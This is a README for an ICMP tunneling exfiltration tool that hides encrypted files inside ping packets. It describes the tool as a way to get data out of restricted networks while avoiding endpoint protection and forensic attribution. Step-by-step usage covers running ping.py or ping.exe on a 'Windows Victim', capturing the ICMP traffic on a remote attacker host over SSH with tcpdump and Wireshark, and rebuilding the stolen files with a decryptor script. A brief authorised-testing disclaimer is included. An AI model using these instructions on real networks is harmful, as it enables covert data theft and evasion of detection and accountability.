# Overview

Based on MITRE Tactics: T1572 Protocol Tunneling, T1030 Data Transfer Size Limits, T1567 Exfiltration Over Web Service, T1090 Multi-hop Proxy

Encrypted version for ICMP tunneling. 

Exfiltration of data in a restricted network environment can be a tough thing to do. When you do things like plugging USB, moving and sending files across networks to yourself, it all leaves an audit trail. This audit trail can be even stronger when used with powerful endpoint protection tools like CrowdStrike. Even when you try to cover your tracks and footprints, using VPNs and deleting log files, there is still a possibility of being traced back to you when digital forensics is being conducted. This could result in the court ordering ISP, service providers to give up subscriber’s VPN information. 

ICMP packets are usually used for troubleshooting network configurations or to check whether hosts are alive. We utilise this to send information or files out to other public endhosts.  

This is for testing purposes only. Use it at your own risk and only on authorised targets. Some parts of the source code are hard-coded to test functionality of the program, do take a look before executing.

## Topology 
Exfiltration of data scenario
![ICMP an0nymizer](https://user-images.githubusercontent.com/92675249/200108432-744d9d1a-0ef7-49f2-86c4-73efccf2072f.jpeg)

### Overview of an encrypted packet
![Screenshot_3](https://user-images.githubusercontent.com/91510432/199401514-62c5d4ef-88d5-4632-8312-259aee4c9328.png)


### Usage 
Two ways to run. 
- Through the exe file. You do not need to install python and its dependencies. 
- The normal python method. Debugging would be easier here if you are testing.

1. `pip3 install -r requirements.txt` [or pip install -r requirements.txt] (Only required if you use the python script method)

2. Move the Documents folder to your Desktop (Windows Victim)

3. Using another Linux machine. You can use VPN/proxychains here.
    - Move your private.pem key here.
    - Move decryptor.py here.

4. Sniffing of packets and decrypting it (Sniffing and reconstructing files or information)
    - If you are sniffing through SSH from a server: Run the command `ssh -i webserver.pem root@<ip address> tcpdump -U -s0 -w - 'not port 22' | wireshark -k -i -`
    - If you are sniffing through a normal private network: Run wireshark and save the pcap file.
    - Copy the temporary wireshark pcap filepath output
    - On the victim machine, execute the python command `python ./ping.py` OR run the ping.exe file located in the dist folder.
    - Monitor wireshark for ICMP pings with bigger than usual data blocks. Stop when all packets are sent
    - Run the command to start the reconstructing files with the filepath copied `python ./decryptor.py -p <paste copied filepath here>`

